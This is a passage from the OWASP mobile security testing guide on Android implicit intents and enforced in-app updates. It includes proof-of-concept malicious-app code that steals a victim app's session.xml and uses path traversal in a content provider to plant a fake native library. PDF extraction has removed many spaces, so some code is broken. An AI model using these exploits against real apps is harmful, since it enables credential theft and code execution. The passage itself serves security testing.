{"text": "Use Xposed to hook into the deserialization methods or add unprocessable in- formation to the serialized objects to see how they are handled (e.g., whether the application crashes or extra informationcanbeextractedbyenrichingtheobjects). Testing Implicit Intents Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview Whentestingforimplicitintentsyouneedtocheckiftheyarevulnerabletoinjectionattacksorpotentiallyleakingsensitive data. Static Analysis InspecttheAndroidManifestandlookforany<intent>signaturesdefinedinsideblocks(whichspecifythesetofother appsanappintendstointeractwith), checkifitcontainsanysystemactions(e.g.android.intent.action.GET_CON- TENT, android.intent.action.PICK, android.media.action.IMAGE_CAPTURE, etc.) and browse the source code for theiroccurrence. Forexample,thefollowingIntentdoesn’tspecifyanyconcretecomponent,meaningthatit’sanimplicitintent. Itsets the action android.intent.action.GET_CONTENT to ask the user for input data and then the app starts the intent by startActivityForResultandspecifyinganimagechooser. Intentintent =newIntent(); intent.setAction(\"android.intent.action.GET_CONTENT\"); startActivityForResult(Intent.createChooser(intent,\"\"),REQUEST_IMAGE); The app uses startActivityForResult instead of startActivity, indicating that it expects a result (in this case an image),soyoushouldcheckhowthereturnvalueoftheintentishandledbylookingfortheonActivityResultcallback. Ifthereturnvalueoftheintentisn’tproperlyvalidated,anattackermaybeabletoreadarbitraryfilesorexecutearbitrary codefromtheapp’sinternal‘/data/data/’storage. Afulldescriptionofthistypeofattackcanbefoundinthe[following blogpost](https://blog.oversecured.com/Interception-of-Android-implicit-intents”Currentattacksonimplicitintents”). Case 1: Arbitrary File Read Inthisexamplewe’regoingtoseehowanattackercanreadarbitraryfilesfromwithintheapp’sinternalstorage/data/ data/<appname>duetotheimpropervalidationofthereturnvalueoftheintent. The performAction method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to getFileItemFromUri. This method copies the file to a temp folder, which is usual if this 295\\nfileisdisplayedinternally. ButiftheappstorestheURIprovidedfileinanexternaltempdirectorye.gbycallinggetEx- ternalCacheDirorgetExternalFilesDiranattackercanreadthisfileifhesetsthepermissionandroid.permission. READ_EXTERNAL_STORAGE. private void performAction(Actionaction){ ... Uridata =intent.getData(); if(!(data ==null ||(fileItemFromUri =getFileItemFromUri(data))==null)) { ... } } private FileItem getFileItemFromUri(Context,context,Uriuri){ StringfileName =UriExtensions.getFileName(uri,context); Filefile =newFile(getExternalCacheDir(),\"tmp\"); file.createNewFile(); copy(context.openInputStream(uri),newFileOutputStream(file)); ... } Thefollowingisthesourceofamaliciousappthatexploitstheabovevulnerablecode. AndroidManifest.xml <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /> <application> <activity android:name=\".EvilContentActivity\"> <intent-filter android:priority=\"999\"> <action android:name=\"android.intent.action.GET_CONTENT\" /> <data android:mimeType=\"*/*\" /> </intent-filter> </activity> </application> EvilContentActivity.java public class EvilContentActivity extends Activity{ @Override protected void OnCreate(@Nullable BundlesavedInstanceState){ super.OnCreate(savedInstanceState); setResult(-1,newIntent().setData(Uri.parse(\"file:///data/data/<victim_app>/shared_preferences/session.xml\"))); finish(); } } If the user selects the malicious app to handle the intent, the attacker can now steal the session.xml file from the app’sinternalstorage. Inthepreviousexample,thevictimmustexplicitlyselecttheattacker’smaliciousappinadialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This wouldallowtheattacktooccurwithoutanyadditionaluserinteraction. Thefollowingcodesampleimplementsthisautomaticselectionoftherecipient. Byspecifyingapriorityinthemalicious app’sintentfilter,theattackercaninfluencetheselectionsequence. Intentintent =newIntent(\"android.intent.action.GET_CONTENT\"); for(ResolveInfoinfo :getPackageManager().queryIntentActivities(intent,0)) { intent.setClassName(info.activityInfo.packageName,info.activityInfo.name); startActivityForResult(intent); return; } Case 2: Arbitrary Code Execution An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows content://andfile://URLs. An attacker can implement a ContentProvider that contains public Cursor query(...) to set an arbitrary file (in this case lib.so), and if the victim loads this file from the content provider by executing copy the attacker’s ParcelFileDescriptor openFile(...) methodwillbeexecutedandreturnamaliciousfakelib.so. AndroidManifest.xml 296\\n<uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /> <application> <activity android:name=\".EvilContentActivity\"> <intent-filter android:priority=\"999\"> <action android:name=\"android.intent.action.GET_CONTENT\" /> <data android:mimeType=\"*/*\" /> </intent-filter> </activity> <provider android:name=\".EvilContentProvider\" android:authorities=\"com.attacker.evil\" android:enabled=\"true\" android:exported=\"true\"></provider> </application> EvilContentProvider.java public Cursor query(Uriuri,String[]projection,Stringselection,String[] selectionArgs,StringsortOrder){ MatrixCursormatrixCursor =newMatrixCursor(newString[]{\"_display_name\"}); matrixCursor.addRow(newObject[]{\"../lib-main/lib.so\"}); return matrixCursor; } public ParcelFileDescriptor openFile(Uriuri,Stringmode)throws FileNotFoundException { return ParcelFileDescriptor.open(newFile(\"/data/data/com.attacker/fakelib.so\"),ParcelFileDescriptor.MODE_READ_ONLY); } EvilContentActivity.java public class EvilContentActivity extends Activity{ @Override protected void OnCreate(@Nullable BundlesavedInstanceState){ super.OnCreate(savedInstanceState); setResult(-1,newIntent().setData(Uri.parse(\"content:///data/data/com.attacker/fakelib.so\"))); finish(); } } Dynamic Analysis Aconvenientwaytodynamicallytestforimplicitintents,especiallytoidentifypotentiallyleakedsensitivedata,istouse Frida or frida-trace and hook the startActivityForResult and onActivityResult methods and inspect the provided intentsandthedatatheycontain. Testing Enforced Updating Platform: android MASVSV1: MSTG-ARCH-9 MASVSV2: MASVS-CODE-2 Overview To test for enforced updating you need to check if the app has support for in-app updates and validate if it’s properly enforcedsothattheuserisnotabletocontinueusingtheappwithoutupdatingitfirst. Static analysis Thecodesamplebelowshowstheexampleofanapp-update: //Part1:checkforupdate //Createsinstanceofthemanager. AppUpdateManagerappUpdateManager =AppUpdateManagerFactory.create(context); //Returnsanintentobjectthatyouusetocheckforanupdate. Task<AppUpdateInfo>appUpdateInfo =appUpdateManager.getAppUpdateInfo(); //Checksthattheplatformwillallowthespecifiedtypeofupdate. if(appUpdateInfo.updateAvailability()==UpdateAvailability.UPDATE_AVAILABLE 297\\n//Foraflexibleupdate,useAppUpdateType.FLEXIBLE && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)){ //...Part2:requestupdate appUpdateManager.startUpdateFlowForResult( //Passtheintentthatisreturnedby'getAppUpdateInfo()'. appUpdateInfo, //Or'AppUpdateType.FLEXIBLE'forflexibleupdates. AppUpdateType.IMMEDIATE, //Thecurrentactivitymakingtheupdaterequest. this, //Includearequestcodetolatermonitorthisupdaterequest. MY_REQUEST_CODE); //...Part3:checkifupdatecompletedsuccessfully @Override public void onActivityResult(intrequestCode,intresultCode,Intentdata){ if(myRequestCode ==MY_REQUEST_CODE){ if(resultCode !=RESULT_OK){ log(\"Updateflowfailed!Resultcode:\" +resultCode); //Iftheupdateiscancelledorfails, //youcanrequesttostarttheupdateagainincaseofforcedupdates } } } //..Part4: //Checksthattheupdateisnotstalledduring'onResume()'. //However,youshouldexecutethischeckatallentrypointsintotheapp. @Override protected void onResume(){ super.onResume(); appUpdateManager .getAppUpdateInfo() .addOnSuccessListener( appUpdateInfo ->{ ... if(appUpdateInfo.updateAvailability() ==UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS)", "metadata": {"doc_id": "OWASP_MASTG", "chunk_id": 110}}